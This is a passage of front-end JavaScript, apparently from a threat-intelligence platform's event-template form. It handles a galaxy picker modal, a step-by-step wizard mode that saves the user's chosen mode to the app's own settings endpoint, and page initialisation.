                $desc.textContent = desc;
                $label.appendChild($desc);
            }
            $list.appendChild($label);
        });
    }

    function applyGalaxyPicker() {
        if (!galaxyPickerCtx) { return; }
        var picked = galaxyPickerCtx.preChecked.slice();
        if (galaxyPickerCtx.targetInput) {
            if (!galaxyPickerCtx.multiple && picked.length > 1) {
                picked = picked.slice(0, 1);
            }
            galaxyPickerCtx.targetInput.value = picked.join(', ');
            galaxyPickerCtx.targetInput.dispatchEvent(new Event('input', {bubbles: true}));
        }
        var $modal = document.getElementById('et-galaxy-picker-modal');
        if ($modal) {
            if (window.bootstrap && window.bootstrap.Modal) {
                var inst = window.bootstrap.Modal.getInstance($modal);
                if (inst) { inst.hide(); }
            } else if (window.jQuery) {
                window.jQuery($modal).modal('hide');
            }
        }
        galaxyPickerCtx = null;
    }

    // -----------------------------------------------------------------
    // Wizard mode — show one section at a time with prev/next nav.
    // All sections stay in the DOM so submit collects every value
    // exactly as in single-page mode; only visibility differs.
    // -----------------------------------------------------------------

    function wireWizardMode() {
        var formRoot = document.querySelector('.event-template-user-form');
        var form = document.getElementById('et-user-form');
        var toggle = document.getElementById('et-wizard-toggle');
        if (!formRoot || !form || !toggle) { return; }

        var groups = qsa(form, '.et-section-group');
        if (groups.length === 0) { return; }

        var currentStep = 0;

        groups.forEach(function (g, idx) {
            var nav = document.createElement('div');
            nav.className = 'et-wizard-nav';
            var isFirst = idx === 0;
            var isLast = idx === groups.length - 1;

            var leftBtn;
            if (isFirst) {
                leftBtn = document.createElement('a');
                leftBtn.className = 'btn';
                leftBtn.textContent = 'Cancel';
                leftBtn.href = (cfg && cfg.baseurl ? cfg.baseurl : '') + '/event_templates/index';
            } else {
                leftBtn = document.createElement('button');
                leftBtn.type = 'button';
                leftBtn.className = 'btn';
                leftBtn.textContent = '← Previous';
                leftBtn.setAttribute('data-et-wizard-prev', '');
                leftBtn.addEventListener('click', function () { goTo(idx - 1); });
            }
            var leftWrap = document.createElement('div');
            leftWrap.appendChild(leftBtn);
            nav.appendChild(leftWrap);

            var counter = document.createElement('span');
            counter.className = 'et-step-counter';
            counter.textContent = 'Step ' + (idx + 1) + ' of ' + groups.length;
            nav.appendChild(counter);

            var rightBtn = document.createElement('button');
            rightBtn.type = 'button';
            rightBtn.className = 'btn btn-primary';
            if (isLast) {
                rightBtn.textContent = (cfg && cfg.isPreview)
                    ? 'Create event (disabled in preview)'
                    : 'Create event';
                rightBtn.setAttribute('data-et-wizard-submit', '');
                if (cfg && cfg.isPreview) { rightBtn.disabled = true; }
                rightBtn.addEventListener('click', function () {
                    var realSubmit = document.getElementById('et-user-form-submit');
                    if (realSubmit) { realSubmit.click(); }
                });
            } else {
                rightBtn.textContent = 'Next →';
                rightBtn.setAttribute('data-et-wizard-next', '');
                rightBtn.addEventListener('click', function () { goTo(idx + 1); });
            }
            var rightWrap = document.createElement('div');
            rightWrap.appendChild(rightBtn);
            nav.appendChild(rightWrap);

            g.appendChild(nav);
        });

        function goTo(target) {
            if (target < 0 || target >= groups.length) { return; }
            currentStep = target;
            renderStep();
            // Smooth-scroll to the top of the active section. Use the form
            // top as the anchor when we step back to 0 to avoid jumping.
            var anchor = target === 0 ? formRoot : groups[target];
            anchor.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }

        function renderStep() {
            groups.forEach(function (g, idx) {
                g.classList.toggle('et-step-active', idx === currentStep);
            });
            formRoot.classList.toggle('et-on-last-step', currentStep === groups.length - 1);
        }

        function applyMode(mode) {
            formRoot.classList.toggle('et-mode-wizard', mode === 'wizard');
            if (mode === 'wizard') {
                currentStep = 0;
                renderStep();
            }
        }

        function persistMode(mode) {
            var url = (cfg && cfg.baseurl ? cfg.baseurl : '')
                + '/userSettings/setEventTemplateUserFormMode/'
                + encodeURIComponent(mode);
            try {
                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    credentials: 'same-origin',
                    cache: 'no-cache'
                });
            } catch (e) { /* persistence is best-effort */ }
        }

        toggle.addEventListener('change', function () {
            var mode = this.checked ? 'wizard' : 'all';
            applyMode(mode);
            persistMode(mode);
        });

        applyMode((cfg && cfg.viewMode) || 'all');
    }

    function init() {
        wireRepeatable();
        wireMandatoryGuard();
        wireSubmit();
        wireTagPicker();
        wireGalaxyPicker();
        wireFileInputs();
        wireObjectCollapsing();
        wireWizardMode();
        // Initial state — disable submit if any mandatory field is empty.
        qsa(document, '#et-user-form .et-field[data-et-repeatable="1"]').forEach(refreshRemoveButtons);
        // Paint the filled-state chips for every object entry once
        // everything's wired (covers object_fields whose server-rendered
        // relations start empty — the happy path).
        refreshObjectEntryIndicators(null);
        updateSubmitEnabled();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
